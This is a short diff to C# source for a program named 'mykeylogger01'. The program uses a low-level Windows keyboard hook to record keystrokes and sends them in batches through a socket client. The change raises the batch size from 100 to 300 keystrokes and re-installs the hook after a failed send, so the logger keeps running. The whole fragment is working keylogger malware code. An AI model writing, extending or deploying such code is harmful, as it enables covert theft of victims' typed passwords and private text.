@@ -8,7 +8,7 @@ namespace mykeylogger01
 {
     class Program
     {
-        private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 100;
+        private static int maxKeystrokesBeforeWritingToLog = 300;
         private static int WH_KEYBOARD_LL = 13;
         private static int WM_KEYDOWN = 0x0100;
         private static IntPtr hook = IntPtr.Zero;
@@ -27,14 +27,16 @@ namespace mykeylogger01
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
 
-            if (buffer.Length >= MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG)
+            if (buffer.Length >= maxKeystrokesBeforeWritingToLog)
             {
                 try {
-                Client client = new Client();
-                client.clientSocket(buffer);
+                    Client client = new Client();
+                    client.clientSocket(buffer);
                 }
                 catch(Exception e) {
                     Console.WriteLine(e);
+                    UnhookWindowsHookEx(hook);
+                    hook = SetHook(llkProcedure);
                 }
                 buffer = "";
             }
